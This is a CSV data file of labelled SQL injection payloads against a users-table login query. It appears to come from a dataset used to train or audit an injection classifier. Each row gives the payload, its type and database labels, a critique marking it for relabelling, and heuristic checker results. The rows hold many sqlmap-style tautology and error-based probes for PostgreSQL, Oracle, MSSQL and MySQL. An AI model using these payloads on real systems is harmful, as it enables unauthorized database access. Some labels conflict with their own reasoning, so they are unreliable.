id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
37954,"select * from users WHERE username = ""-1254"" and username = ""1 ) and ( 9932 = 9932"" and username = ""1%\' ) ) and ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1 ) and ( 9932 = 9932"" and username = ""1%\' ) ) and ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37955,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-4952\' ) ) ) and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-4952\' ) ) ) and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37956,"select * from users WHERE username = ""-7072\' ) and username = ""-6079 ) ) ) and ( ( ( 8708 = 8708""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-7072\' ) and username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37957,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-4582 ) ) as gvfo where 8885 = 8885",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-4582 ) ) as gvfo where 8885 = 8885",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37958,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37959,"select * from users WHERE username = ""-7199\' and username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-6353%\' ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-7199\' and username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-6353%\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37960,"select * from users WHERE username = ""-1254"" and username = ""1 ) where 3381 = 3381 and username = ""1\' where 8537 = 8537 and ( ( ( 8708 = 8708""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1 ) where 3381 = 3381 and username = ""1\' where 8537 = 8537 and ( ( ( 8708 = 8708",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37961,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\',True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37962,"select * from users WHERE username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37963,"select * from users WHERE username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37964,"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq"" or username = ""-1639 ) )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq"" or username = ""-1639 ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37965,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" or username = ""1\' ) where 1502 = 1502 and username = ""-9501\' ) and ( \'mndw\' = \'mndw""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\' ) where 1502 = 1502 and username = ""-9501\' ) and ( \'mndw\' = \'mndw",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37966,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37967,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'pneh\' like \'pneh"" and username = ""-4952\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'pneh\' like \'pneh"" and username = ""-4952\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37968,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-6190\' ) where 2621 = 2621 or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37969,"select * from users WHERE username = ""-9501\' ) and username = ""-5020%\' ) and ( \'%\' = \'"" or username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"-9501\' ) and username = ""-5020%\' ) and ( \'%\' = \'"" or username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
37970,"select * from users WHERE username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and ( ( ( \'btjx\' = \'btjx""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and ( ( ( \'btjx\' = \'btjx",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
37971,"select * from users WHERE username = ""-8860 ) and username = ""1"" and username = ""1 )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,"select * from users WHERE username = ""-8860 ) and username = ""1"" and username = ""1 )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37972,"select * from users WHERE username = ""-8353\' ) ) ) and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-8353\' ) ) ) and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37973,"select * from users WHERE username = ""-2920\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-2920\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37974,"select * from users WHERE username = ""1\' ) ) and username = ""1\'+ ( select twyt where 3376 = 3376 or username = ""-2756\' where 6156 = 6156",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) and username = ""1\'+ ( select twyt where 3376 = 3376 or username = ""-2756\' where 6156 = 6156",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37975,"select * from users WHERE username = ""-5667%\' ) ) and username = ""1\' ) where 1502 = 1502 or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-5667%\' ) ) and username = ""1\' ) where 1502 = 1502 or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37976,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" and username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",error_based,mysql,0.8,elt and if for MySQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" and username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
37977,"select * from users WHERE username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
37978,"select * from users WHERE username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1\'+ ( select onzd where 8452 = 8452",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1\'+ ( select onzd where 8452 = 8452",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
